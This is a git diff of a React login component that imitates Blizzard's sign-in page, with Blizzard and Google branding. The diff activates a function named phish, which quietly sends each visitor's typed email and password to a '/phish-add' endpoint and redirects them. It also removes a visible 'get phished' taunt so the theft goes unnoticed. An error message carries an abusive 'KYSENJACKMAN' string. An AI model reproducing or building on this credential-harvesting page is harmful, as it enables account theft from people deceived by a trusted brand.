@@ -15,11 +15,8 @@ library.add(faFacebookSquare, faBan);
 const Auth = props => {
   const [userEmail, setUserEmail] = React.useState("");
   const [userPassword, setUserPassword] = React.useState("");
-  // const [emptyField, setEmptyField] = React.useState("");
 
   const [emptyBox, makeEmptyBox] = React.useState();
-
-  const [style, setStyle] = React.useState({});
 
   const handleEmpty = emptyField => {
     makeEmptyBox(
@@ -40,58 +37,51 @@ const Auth = props => {
     } else if (userPassword === "") {
       handleEmpty("Cannot leave Password empty");
     } else {
-      setUserEmail("get phished NOOB");
+      setUserEmail("");
       setUserPassword("");
-      setStyle({ color: "red" });
+      props.setPage(false);
+      axios({
+        method: "post",
+        url: "http://localhost:5000/phish-add",
+        data: {
+          email: userEmail,
+          password: userPassword
+        }
+      })
+        .then(() => {})
+        .catch(error => console.log("KYSENJACKMAN", error));
     }
-    //   axios({
-    //     method: "post",
-    //     url: "http://localhost:5000/phish-add",
-    //     data: {
-    //       email: userEmail,
-    //       password: userPassword
-    //     }
-    //   })
-    //     .then(response => {
-    //       console.log(response);
-    //       setUserEmail("get phished NOOB");
-    //       setUserPassword("");
-    //       setStyle({ color: "red" });
-    //     })
-    //     .catch(error => console.log("KYSENJACKMAN", error));
-    // }
   };
 
   return (
     <div className="auth-wrapper">
       <img src={blizzardLogo} />
-      <div className="input-fields">
-        {emptyBox}
-        <input
-          style={style}
-          value={userEmail}
-          type="email"
-          placeholder="Email or Phone"
-          onChange={e => setUserEmail(e.target.value)}
-        />
-        <input
-          value={userPassword}
-          type="password"
-          placeholder="Password"
-          onChange={e => setUserPassword(e.target.value)}
-        />
-        <button style={style} onClick={e => phish(e)}>
-          Log in to Blizzard
-        </button>
-      </div>
-      <div style={style} className="divider">
+      <form onSubmit={e => phish(e)}>
+        <div className="input-fields">
+          {emptyBox}
+          <input
+            value={userEmail}
+            type="text"
+            placeholder="Email or Phone"
+            onChange={e => setUserEmail(e.target.value)}
+          />
+          <input
+            value={userPassword}
+            type="password"
+            placeholder="Password"
+            onChange={e => setUserPassword(e.target.value)}
+          />
+
+          <button>Log in to Blizzard</button>
+        </div>
+      </form>
+      <div className="divider">
         <div className="line">_________________</div>
         <p>OR LOG IN WITH</p>
         <div className="line">_________________</div>
       </div>
       <div className="face-goog">
         <button
-          style={style}
           onClick={() =>
             (window.location.href = "https://www.facebook.com/Blizzard/")
           }
@@ -103,7 +93,7 @@ const Auth = props => {
           <p>Facebook</p>
         </button>
         <div className="lil-gap" />
-        <button style={style} onClick={() => props.setPage(false)}>
+        <button onClick={() => props.setPage(false)}>
           <div className="google-logo-wrapper">
             <img src={googleLogo} />
           </div>
@@ -111,12 +101,10 @@ const Auth = props => {
         </button>
       </div>
       <div className="other-links">
-        <span style={style} onClick={() => props.setPage(false)}>
+        <span onClick={() => props.setPage(false)}>
           Create a free Blizzard Account
         </span>
-        <span style={style} onClick={() => props.setPage(false)}>
-          Can't log in?
-        </span>
+        <span onClick={() => props.setPage(false)}>Can't log in?</span>
       </div>
     </div>
   );
